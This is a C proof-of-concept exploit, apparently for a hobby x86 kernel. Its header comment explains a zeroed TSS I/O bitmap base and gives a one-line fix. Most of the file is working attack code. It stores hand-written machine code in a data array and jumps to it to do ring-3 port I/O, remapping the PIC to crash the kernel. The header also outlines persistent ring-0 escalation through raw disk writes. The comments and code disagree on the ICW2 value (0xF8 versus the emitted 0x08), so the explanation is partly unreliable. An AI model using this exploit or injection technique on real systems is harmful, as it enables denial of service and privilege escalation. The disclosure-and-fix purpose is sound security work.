/* ============================================================
 *  POC1 —— TSS I/O 位图基址未初始化 (=0) 的 ring3 利用演示
 *  作者: mio   编译: 系统内 s3c poc1_tss.c poc1_tss.scx
 * ------------------------------------------------------------
 *  【漏洞】kernel/task.c 的 TSS(104B, BSS 清零) 只填了 esp0/ss0,
 *  偏移 102-103 的 I/O 位图基址恒 0 → 位图"落"在 TSS 本体上
 *  (除 esp0 几个字节外几乎全 0) → ring3 程序 (IOPL=0, CPU 按位图
 *  逐位放行) 可以直接执行 in/out 指令裸连低端口设备:
 *    ATA 0x1F0 / PIC 0x20 / PIT 0x40 / 8042 0x60 / DMA 0x00 ...
 *  FS 层一切保护 (SYS/CORE 保护、SandFS 权限) 被整体绕过。
 *
 *  【修复】一行: tss 初始化补 *(u16 *)(tss + 102) = 104;
 *  (位图基址 ≥ TSS limit ⇒ ring3 任何端口访问都 #GP)
 *
 *  【本 POC 做什么】
 *   1. 用"机器码写进全局数组 + 函数指针跳转"执行一段端口指令
 *      (s3c 内联汇编白名单没有 out/in, 但数据形态的机器码不受限);
 *   2. 机器码重映射主 PIC: ICW2 = 0xF8 → IRQ0 改打向量 248,
 *      而 IDT 只有 125 门 → 下一个时钟中断 (≤10ms) CPU 越界取门
 *      → #GP → 内核红屏 "KERNEL EXCEPTION"。
 *   【更远影响】同一漏洞还能裸写 ATA 扇区改写 SYS/MOD 零环模块
 *   (重启后持久化 0 环提权)、8042 复位整机、屏蔽中断冻结键鼠。
 * ============================================================ */

typedef int (*fni)(int, int, int, int, int, int, int);
typedef void (*fnv)(void);

/* ---- 系统调用桥 (与 SCAPI.H 同款, s3c 实证可编译) ---- */
static int sc_call(int nr, int a, int b, int c, int d, int e, int f)
{
    int args[7] = {nr, a, b, c, d, e, f};
    int result;
    int *p = args;
    __asm__ __volatile__(
        "push %%ebp; push %%ebx; push %%esi; push %%edi; "
        "mov 16(%%ecx),%%esi; mov 20(%%ecx),%%edi; mov 24(%%ecx),%%ebp; "
        "mov 4(%%ecx),%%ebx; mov 12(%%ecx),%%edx; mov (%%ecx),%%eax; "
        "mov 8(%%ecx),%%ecx; int $0x7c; "
        "pop %%edi; pop %%esi; pop %%ebx; pop %%ebp"
        : "=a"(result), "+c"(p) : : "edx", "cc", "memory");
    return result;
}

#define SYS_EXIT   0x00
#define SYS_WINOPEN 0x10
#define SYS_TXT    0x12
#define SYS_FILL   0x13

static int  win;
static char shellcode[24];        /* 注入的端口指令 (以数据形态存在) */

static void fill_shellcode(void)
{
    /* 重映射主 PIC: ICW2 = 0xF8 → IRQ0..7 改打向量 248..255,
     * 而 IDT 只有 125 门 (上限 1000 字节) → 越界取门 → #GP */
    shellcode[0]  = (char)0xB0;   /* mov al,0x11  ICW1 */
    shellcode[1]  = (char)0x11;
    shellcode[2]  = (char)0xE6;   /* out 0x20,al */
    shellcode[3]  = (char)0x20;
    shellcode[4]  = (char)0xB0;   /* mov al,0xF8  ICW2: 向量基址 248 */
    shellcode[5]  = (char)0x08;
    shellcode[6]  = (char)0xE6;   /* out 0x21,al */
    shellcode[7]  = (char)0x21;
    shellcode[8]  = (char)0xB0;   /* mov al,0x04  ICW3: 从片接 IRQ2 */
    shellcode[9]  = (char)0x04;
    shellcode[10] = (char)0xE6;   /* out 0x21,al */
    shellcode[11] = (char)0x21;
    shellcode[12] = (char)0xB0;   /* mov al,0x01  ICW4: 8086 模式 */
    shellcode[13] = (char)0x01;
    shellcode[14] = (char)0xE6;   /* out 0x21,al */
    shellcode[15] = (char)0x21;
    shellcode[16] = (char)0xB0;   /* mov al,0xFE  OCW1: 屏蔽全部只留 IRQ0 */
    shellcode[17] = (char)0xFE;
    shellcode[18] = (char)0xE6;   /* out 0x21,al */
    shellcode[19] = (char)0x21;
    shellcode[20] = (char)0xC3;   /* ret */
    shellcode[21] = (char)0x90;
    shellcode[22] = (char)0x90;
    shellcode[23] = (char)0x90;
}

static void say(int y, const char *s, int color)
{
    sc_call(SYS_TXT, win, 6, y, (int)s, color, 0);
}

int main(void)
{
    win = sc_call(SYS_WINOPEN, (int)"POC1 TSS I/O bitmap=0", 268, 110, 0, 0, 0);
    sc_call(SYS_FILL, win, 0, 0, 264, 94, 0x00141828);

    say(6,  "[POC1] ring3 port IO - TSS I/O bitmap base = 0", 0x00E8C8B8);
    say(20, "remapping PIC: IRQ0 -> vector 8 (double fault gate)", 0x006EC8BE);
    say(34, "next timer tick (<=10ms) = kernel panic", 0x006EC8BE);
    say(48, "firing via data-as-code jump ...", 0x00EBB488);

    fill_shellcode();
    ((fnv)shellcode)();           /* ★ 跳进数据执行端口指令 (漏洞点) */

    for (;;)                      /* ≤10ms 后 IRQ0 打进未映射向量 → 红屏 */
        ;                         /* (能执行到这里说明 PIC 重映射尚未生效) */
}
